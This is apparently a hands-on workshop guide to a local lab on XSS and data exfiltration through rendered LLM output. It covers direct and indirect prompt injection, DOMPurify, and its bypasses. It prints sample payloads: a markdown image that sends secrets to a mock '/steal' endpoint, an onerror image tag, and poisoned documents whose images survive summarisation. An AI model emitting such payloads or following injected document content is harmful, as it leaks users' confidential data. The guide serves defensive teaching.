# Hands-on Guide

The main act is the **"AI Lab" tab**. Experience the XSS / data exfiltration that happens when an
LLM's output is rendered on screen, in the order **attack → defend → still leaks → defend properly** (~27 min).

> ⚠️ Only practice attacks on your own local environment. Nothing is ever sent to the outside world
> (`/api/ai/steal` is a local "mock attacker server"). Never copy this code into production.

---

## 0. Setup (3 min)

Open two terminals.

**Terminal A (backend)**
```bash
cd backend
# (Optional) to use Gemini: cp .env.example .env and fill in GEMINI_API_KEY
uv run uvicorn app.main:app --reload --port 8000
```

**Terminal B (frontend)**
```bash
cd frontend
bun install
bun run dev
```

Open **http://localhost:5173** in your browser → go to the **"AI Lab"** tab.

> 💡 **A Gemini key is optional.** Without one it falls back to "mock responses", which is enough to
> reproduce the attacks. With a key you can freely try real prompt injection
> (free key at Google AI Studio: https://aistudio.google.com/apikey).

How to read the screen:
- The **render mode** at the top (Raw / DOMPurify / safe) = the defense level. Toggle it to compare behavior.
- The **Chat** tab = direct injection; the **Document Summarizer** tab = indirect injection.
- The **"Data received by the attacker server"** panel at the bottom = the exfiltration visualization.

---

## 1. Direct injection (AI Chat) (4 min)

Set the render mode to **Raw**. In the **Chat** tab:

1. Click **"Direct #1 — make the AI output a tracking image (exfiltration, no JS)"** → Send.
   → The AI emits `![](…/steal?c=…)`. The image loads and data leaks into the **attacker panel**.
2. Click **"Direct #2 — make the AI write an <img> tag with onerror"** → Send.
   → The AI emits `<img … onerror="alert('XSS')">` → `alert` fires the moment it's rendered.

**What happened?** You just asked the AI to "turn this into an image" / "show an example." The AI's
output was **rendered without any defense**, so XSS / exfiltration succeeded. **An LLM's output = untrusted input.**

> 💡 Why not bluntly ask "output code that steals cookies"? → Strong models refuse that.
> **Even innocent-looking requests can produce a payload** = "you can't rely on the model's safety filter" — today's key point.

---

## 2. Indirect injection (AI Document Summarizer) (4 min) — this is the scary one

Keep the render mode at **Raw**. In the **Document Summarizer** tab:

1. Click **"Indirect #1 — poisoned release note (banner image exfiltrates data)"** → Summarize.
2. The banner image `![](…/steal?c=CONFIDENTIAL…)` buried in the document survives into the summary and loads
   → **confidential data leaks** into the **attacker panel**.
3. Try **"Indirect #2 — poisoned meeting minutes (tracking image)"** too.

**What happened?** The AI **just summarized**. But it passed through the image embedded in the document
(because it's configured to "keep images") and sent the secret outside. RAG and "summarize this URL" features
can all be an entry point for this.

> 💡 Indirect #1 uses **zero JavaScript** (it just loads an image). That's the setup for the second half.

---

## 3. Defense #1: add DOMPurify (4 min)

Switch the render mode to **DOMPurify** (no need to re-post; only the rendering changes).

- **Direct #2 (onerror) → stops firing** 🎉 (the `onerror` attribute is removed)
- **How it works**: DOMPurify isn't regex — it **builds the HTML string into a real DOM (tree)**,
  **removes dangerous nodes/attributes/URLs from the tree**, and returns safe HTML.
- **Order matters**: always "Markdown → HTML" first, THEN "sanitize" (see `src/render.ts`). Reversed, symbols break / HTML slips through.

👉 The JS-based one (onerror) is stopped. You'd like to say "we're safe!" but…
**what about the "images" in Direct #1 / Indirect #1?** Next.

---

## 4. Bypass 1: DOMPurify doesn't stop image exfiltration (4 min) — the shocker

Keep the render mode at **DOMPurify** and run **Document Summarizer → "Indirect #1"** again.

→ **It still leaks.** The confidential data lands in the **attacker panel**.

**Why?** DOMPurify allows `<img>` as a **legitimate tag**. So `![](…/steal?c=secret)` survives, the browser
fetches it, and the secret in the URL is sent. **No JS is used, so removing `onerror` doesn't help.**

**Defense (verify with the 🔒 safe mode):**
- Restrict image `src` to **same-origin** (drop external images)
- In production, also pin the destination with **CSP `img-src 'self'`**

→ Switch to **safe** and external images are removed, stopping the leak (the `safe` branch in `src/render.ts`'s `renderLLM`).

---

## 5. Live coding: grow `src/render.ts` (10 min)

`renderLLM()` in `frontend/src/render.ts` is the star. Read/write the `mode` branches together, top to bottom.

```ts
// vuln: raw HTML as-is (defenseless)
if (mode === "vuln") return rawHtml;

// dompurify: plain DOMPurify (onerror/js are removed, but… image exfiltration remains)
if (mode === "dompurify") return DOMPurify.sanitize(rawHtml);

// safe: (1) allowlist URL schemes (2) remove external images
const cleaned = DOMPurify.sanitize(rawHtml, { ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|#|\/)/i });
// …remove <img> with external src… (also pair with CSP in production)
```

The remaining two bypasses to talk through (see slides):
- **Bypass 2 (SSR)**: DOMPurify "uses the DOM" → Next.js SSR has no DOM → needs jsdom; a misconfig lets it slip through.
  The guidance: **sanitize on the client**, or build elements with `react-markdown`.
- **Bypass 3 (URL)**: an AI-generated URL you pass to `href` yourself never goes through DOMPurify → validate with `new URL()`, allow only `http/https`.

---

## FAQ ("wait, what?")

- **Q. I set a key but it stays `provider: mock` (the real AI isn't used).**
  → `curl http://localhost:8000/api/ai/health` shows the cause. `key_set:false` means `.env` isn't loaded (place it and restart).
  Old model names (e.g. `gemini-2.5-*` 404s for new keys) or congestion (503/429) make all attempts fail.
  It auto-discovers usable models to recover; to pin them, set `GEMINI_MODELS=...` in `.env`.
  Mock still reproduces the attack (it extracts the payload from the input and fires).
- **Q. All I get is an alert / just data in the panel. Is that right?**
  → Yes. The alert proves "code executed"; the attacker panel proves "data leaked out."
- **Q. On mock it isn't a real AI. Does it still count?**
  → Yes. XSS's weak point is "where the output is rendered" — whether the AI is real is irrelevant. The mock passes the input payload through, so the attack is faithfully reproduced.
- **Q. Nothing shows in the attacker panel.**
  → Click "Refresh" / in 🔒 safe mode it doesn't leak (that's correct) / Indirect #1's image takes a moment to load.
- **Q. Cookies/logs pile up when I repeat.**
  → Use "Clear attacker log" to reset.

---

## Wrap-up (say it out loud)

- **An LLM's output is untrusted input too.** It needs sanitization just like user input.
- Injection is **direct** and **indirect**. Indirect (poisoned documents / RAG) is especially scary.
- **DOMPurify works via the DOM** → a pitfall under SSR. Do it on the client.
- Even with DOMPurify, **image exfiltration and URL traps** aren't covered → **validation + CSP**.
- It's not "add it and you're done" — **understand how it works and its limits, and design accordingly.**

---

## (Basics / extra time) The Comment Board tab

The "Comment Board (basics)" tab is plain XSS without AI (comment posting).
Good for warming up newcomers to XSS or for an opening demo. See the code in `src/CommentBoard.tsx` / `renderComment`.
